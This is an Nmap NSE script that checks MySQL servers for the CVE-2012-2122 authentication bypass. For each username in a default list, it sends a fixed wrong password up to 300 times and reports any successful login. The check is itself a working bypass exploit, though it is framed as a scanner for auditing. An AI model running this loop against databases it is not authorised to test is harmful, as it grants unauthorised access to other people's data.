description = [[
Checks for MySQL servers vulnerable to the authentication bypass CVE-2012-2122 
posted to http://seclists.org/oss-sec/2012/q2/493
]]

---
-- @output
-- 3306/tcp open  mysql
-- | mysql-auth-bypass: 
-- |_  user root is vulnerable to auth bypass


author = "Marc Wickenden"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive", "vulnerability"}

require 'shortport'
require 'stdnse'
require 'mysql'
require 'unpwdb'

-- Version 0.1
-- Created 11/06/2012 - v0.1 - created by Marc Wickenden <marc@offensivecoder.com>, based on nse script by Patrik Karlsson

portrule = shortport.port_or_service(3306, "mysql")

action = function( host, port )

	local socket = nmap.new_socket()
  local catch = function() socket:close() end
  local try = nmap.new_try(catch)
	local result = {}

	-- set a reasonable timeout value
	socket:set_timeout(5000)

  -- get our usernames to try
  local usernames = try(unpwdb.usernames())
  local password = "cve-2012-2122"

	for username in usernames do
    stdnse.print_debug( "Trying %s ...", username )

    -- try up to 300 times to trigger the vuln
    for i = 0, 300, 1 do
      stdnse.print_debug(2, "attempt number %d", i )

      local status, response = socket:connect(host, port)
      if( not(status) ) then return "  \n  ERROR: Failed to connect to mysql server" end
      
      status, response = mysql.receiveGreeting( socket )
      if ( not(status) ) then
        stdnse.print_debug(3, SCRIPT_NAME)
        socket:close()
        return response
      end
		
      status, response = mysql.loginRequest( socket, { authversion = "post41", charset = response.charset }, username, password, response.salt )	
      if response.errorcode == 0 then
        table.insert(result, string.format("user %s is vulnerable to auth bypass", username ) )
        break
      end
      socket:close()
    end
	end
	
	return stdnse.format_output(true, result)	

end
